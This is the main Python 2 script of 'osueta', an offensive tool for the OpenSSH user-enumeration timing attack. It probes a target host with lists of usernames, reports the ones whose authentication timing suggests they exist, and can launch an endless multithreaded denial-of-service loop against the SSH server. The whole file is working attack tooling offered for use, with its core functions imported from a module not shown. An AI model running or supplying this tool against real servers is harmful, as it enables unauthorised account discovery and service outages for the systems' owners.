#!/usr/bin/python
# -*- coding: utf-8 -*-
__license__="""
osueta (OpenSSH User Enumeration Timing Attack)

A simple Python script to exploit the OpenSSH User Enumeration Timing Attack:

http://cureblog.de/openssh-user-enumeration-time-based-attack/
http://seclists.org/fulldisclosure/2013/Jul/88 

Authors:
	c0r3dump | coredump<@>autistici.org
	rofen | rofen<@>gmx.de

Osueta project site: https://github.com/c0r3dump3d/osueta 

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors disclaims all responsibility in the use of this tool.

"""

from osufunc import * 
import argparse
from IPy import IP

def main():
 
	parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack')
	parse.add_argument('-H', action='store', dest='host', help='Host ip to attack')
	parse.add_argument('-f', action='store', dest='fqdn', help='FQDN to attack')
	parse.add_argument('-p', action='store', dest='port', help='Host port')
	parse.add_argument('-L', action='store', dest='ufile', help='Username list file')
	parse.add_argument('-U', action='store', dest='user', help='Only use a single username')
	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds')
	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the username (default yes)')
	parse.add_argument('--dos', action='store', dest='dos',default = 'no', help='Try to make a DOS attack (default no)')
	parse.add_argument('-t', action='store', dest='threads',default = '5', help='Threads for the DOS attack (default 5)')

	argus=parse.parse_args()

	if argus.host == None and argus.fqdn == None:
 		parse.print_help()
 		exit
	elif argus.port == None:
 		parse.print_help()
 		exit
 	elif argus.ufile == None and argus.user == None:
 		parse.print_help()
 		exit
	elif argus.delay == None:
		parse.print_help()
		exit
	elif argus.vari != 'yes' and argus.vari !='no':
		parse.print_help()
		exit
	else:
		if argus.host != None:
			host = argus.host
		if argus.fqdn != None:
			try:
				fqdn = argus.fqdn
				host = socket.gethostbyname(fqdn)
			except socket.gaierror, err:
				print "Cannot resolve hostname: ", name, err
				exit(1)
		port = argus.port
 		defTime = int(argus.delay)
 		vari = argus.vari
		dos = argus.dos
		threads = int(argus.threads)
 		try:
 			IP(host)
 		except ValueError:
 			print "Invalid host address."
 			exit(1)
		welcome()
		if argus.ufile != None:
			try:
				userFile = open (argus.ufile,'r')
			except IOError:
				print "The file %s doesn't exist." % (argus.ufile)
				print "Nothing to do."
				exit(1)
			foundUser = []
			print
			banner = sshBanner(host,port)
			print
			userNames = prepareUserNames(userFile,vari)            
			for userName in userNames:
				sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				fUser = sshTime(host,port,userName,sock,defTime)
				if fUser != -1 and fUser !=None:
					foundUser.append(fUser)
				sock.close()
			if len(foundUser) == 0:
				print "No users found." 
				exit(1)
			else:	 
				print
				print "Server version: " + banner
				print
				print "Users found      Time delay in seconds"
				print "--------------------------------------"
				for entry in foundUser:
					if entry != -1:
						userfdos = entry[0]
						print entry[0] + "                      " + str(entry[3])
		else: 
         
			if vari == 'yes':
				print
				banner = sshBanner(host,port)
				print
				foundUser = []
				user = argus.user
				userNames =  createUserNameVariationsFor(user)
 				userNames = list(set(userNames))
				for userName in userNames:
					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					fUser = sshTime(host,port,userName,sock,defTime)
					if fUser != -1 and fUser !=None:
						foundUser.append(fUser)
					sock.close()
				if len(foundUser) == 0:
					print "No users found. " 
					exit(1)

				else:	 
					print
					print "Server version: " + banner
					print
					print "Users found      Time delay in seconds"
					print "--------------------------------------"
					for entry in foundUser:
						if entry != -1:
							userfdos = entry[0]
							print entry[0] + "                      " + str(entry[3])
			if vari == 'no':
				print
				banner = sshBanner(host,port)
				print
				foundUser = []
				user = argus.user
				sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				fUser = sshTime(host,port,user,sock,defTime)
				if fUser != -1 and fUser !=None:
					foundUser.append(fUser)
				sock.close()
				if len(foundUser) == 0:
					print "No user " + user + " found." 
					exit(1)
				else:	 
					print
					print "Server version: " + banner
					print
					print "Users found      Time delay in seconds"
					print "--------------------------------------"
					for entry in foundUser:
						if entry != -1:
							userfdos = entry[0]
							print entry[0] + "                      " + str(entry[3])
		if dos == 'yes':
			print 
			print "Trying to establish a DOS condition with user " + userfdos + " and " + str(threads) +  " threads ..."
			print "If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop."

			while 1 : 
		        	for att in range(threads):
					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					t = Thread(target=sshDos, args=(host, port, userfdos, sock, defTime))
			      		t.start()

